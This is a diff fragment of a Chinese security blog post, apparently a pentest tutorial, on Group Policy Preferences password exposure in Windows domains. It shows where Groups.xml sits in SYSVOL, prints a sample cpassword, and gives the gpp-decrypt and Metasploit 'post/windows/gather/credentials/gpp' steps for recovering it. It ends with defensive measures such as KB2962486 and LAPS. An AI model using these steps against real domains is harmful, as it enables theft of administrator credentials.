+<p>  管理员在域中新建一个组策略后，操作系统会自动在SYSVO共享目录中生成一个XML文件，即<code>Groups.xml</code>,该文件中保存了该组策略更新后的密码。</p>
+</blockquote>
+<p>根据test的ID 去访问 <code>\\test.yhy\SYSVOL\test.yhy\Policies</code> 或者本地的<code>C:\Windows\SYSVOL\domain\Policies</code>相对应的策略。</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084723.png" alt="image-20210116130016932"></p>
+<p>打开，访问<code>\Machine\Preferences\Groups</code>，找到文件<code>Groups.xml</code>，</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084729.png" alt="image-20210116130711551"></p>
+<p>其中的关注点为<code>cpassword</code>: fjomcrwPmyEFuKDFM1WGGDUe8Ap1iGL/RsEuyDABYBI</p>
+<h4 id="3-2-2-漏洞利用"><a href="#3-2-2-漏洞利用" class="headerlink" title="3.2.2 漏洞利用"></a>3.2.2 漏洞利用</h4><p>介绍两种简单的利用方式</p>
+<ul>
+<li>  Kali 下，将cpassword 字段复制到kali中，使用gpp-decrypt 进行破解</li>
+</ul>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084757.png" alt="img"></p>
+<ul>
+<li><p>msf 模块</p>
+<p>  使用msf后渗透模块</p>
+<p>  <code>run post/windows/gather/credentials/gpp</code></p>
+<p>  当拿到目标的session后（这里直接将msf生成的马，通过ftp上传，并执行）</p>
+</li>
+</ul>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084804.png" alt="image-20210116134115737"></p>
+<h2 id="4-组策略首选项提权的防御措施"><a href="#4-组策略首选项提权的防御措施" class="headerlink" title="4. 组策略首选项提权的防御措施"></a>4. 组策略首选项提权的防御措施</h2><p>在用于管理组策略的计算机上安装 KB2962486补丁，防止新的凭据被放置在组策略首选项中。微软在2014年修复了组策略首选项提权漏洞，使用的方法就是不再将密码保存在组策略首选项中。</p>
+<p>此外，针对Everyone访问权限进行设置，具体如下：</p>
+<ol>
+<li> 设置共享文件夹SYSVOL的访问权限</li>
+<li> 将包含组策略密码的 XML 文件从 SYSVOL 目录中删除s</li>
+<li> 不要把密码放在所有域用户都有权访问的文件中 </li>
+<li> 如果需要更改域中机器的本地管理员密码，建议使用LAPS</li>
+</ol>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
       </tags>
   </entry>
   <entry>
